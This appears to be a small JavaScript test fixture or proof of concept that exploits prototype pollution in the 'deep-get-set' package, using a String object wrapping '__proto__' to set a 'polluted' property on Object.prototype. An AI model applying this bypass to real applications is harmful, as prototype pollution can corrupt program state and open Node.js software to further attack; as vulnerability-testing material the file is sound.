function getPayload() {
    const deep = require("deep-get-set");

    return {
        polluted: undefined,
        setPollution: () => {
            deep({}, [new String("__proto__"), "polluted"], "yes");
        }
    };
}

module.exports = { getPayload };